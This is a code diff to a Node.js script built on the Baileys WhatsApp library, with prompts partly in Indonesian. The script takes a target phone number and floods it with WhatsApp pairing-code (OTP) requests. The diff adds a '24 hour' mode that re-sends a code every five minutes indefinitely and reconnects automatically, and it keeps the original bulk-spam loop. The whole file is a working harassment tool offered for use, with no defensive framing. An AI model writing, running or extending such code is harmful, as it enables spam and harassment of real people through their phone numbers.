@@ -1,4 +1,4 @@
-import makeWASocket, { useMultiFileAuthState } from "@whiskeysockets/baileys";
+import makeWASocket, { useMultiFileAuthState, DisconnectReason } from "@whiskeysockets/baileys";
 import pino from 'pino';
 import readline from "readline";
 
@@ -20,7 +20,7 @@ const question = (text) => {
 };
 
 async function KleeProject() {
-    const { state } = await useMultiFileAuthState('./69/session');
+    const { state, saveCreds } = await useMultiFileAuthState('./69/session');
     const KleeBotInc = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
@@ -36,21 +36,52 @@ async function KleeProject() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
     try {
-        const phoneNumber = await question(color + 'Target : ' + xColor);
-        const KleeCodes = parseInt(await question(color + 'Total spam : ' + xColor));
+        const mode = await question(color + 'Pilih mode (1: Single spam, 2: 24 jam) : ' + xColor);
 
-        if (isNaN(KleeCodes) || KleeCodes <= 0) {
-            console.log('example : 20.');
-            return;
-        }
+        if (mode === '2') {
+            const phoneNumber = await question(color + 'Target : ' + xColor);
+            let count = 0;
 
-        for (let i = 0; i < KleeCodes; i++) {
-            try {
-                let code = await KleeBotInc.requestPairingCode(phoneNumber);
-                code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
-            } catch (error) {
-                console.error('Error:', error.message);
+            KleeBotInc.ev.on('connection.update', ({ connection, lastDisconnect }) => {
+                if (connection === 'close') {
+                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+                    if (shouldReconnect) {
+                        console.log(color + 'Koneksi putus, reconnect...' + xColor);
+                        KleeProject();
+                    }
+                }
+            });
+            KleeBotInc.ev.on('creds.update', saveCreds);
+
+            const sendPeriodic = async () => {
+                try {
+                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
+                    count++;
+                    console.log(color + `[${new Date().toLocaleString()}] OTP ${count} terkirim ke ${phoneNumber}` + xColor);
+                } catch (error) {
+                    console.error(`[${new Date().toLocaleString()}] Error: ${error.message}`);
+                }
+            };
+
+            await sendPeriodic();
+            setInterval(sendPeriodic, 300000);
+        } else {
+            const phoneNumber = await question(color + 'Target : ' + xColor);
+            const KleeCodes = parseInt(await question(color + 'Total spam : ' + xColor));
+
+            if (isNaN(KleeCodes) || KleeCodes <= 0) {
+                console.log('example : 20.');
+                return;
+            }
+
+            for (let i = 0; i < KleeCodes; i++) {
+                try {
+                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
+                    code = code?.match(/.{1,4}/g)?.join("-") || code;
+                    console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
+                } catch (error) {
+                    console.error('Error:', error.message);
+                }
             }
         }
     } catch (error) {
